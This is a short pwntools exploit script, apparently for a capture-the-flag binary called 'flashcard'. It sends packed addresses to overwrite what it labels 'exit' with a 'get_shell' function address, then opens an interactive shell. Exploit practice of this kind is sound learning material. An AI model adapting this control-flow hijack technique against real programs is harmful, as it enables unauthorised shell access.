from pwn import*

p = process('./flashcard')
gdb.attach(p, api=True)

get_shell = 0x00000000004011b5
exit = 0x404040

payload = p64(exit)
p.sendline(payload)

payload = p64(get_shell)
p.sendline(payload)
p.interactive()
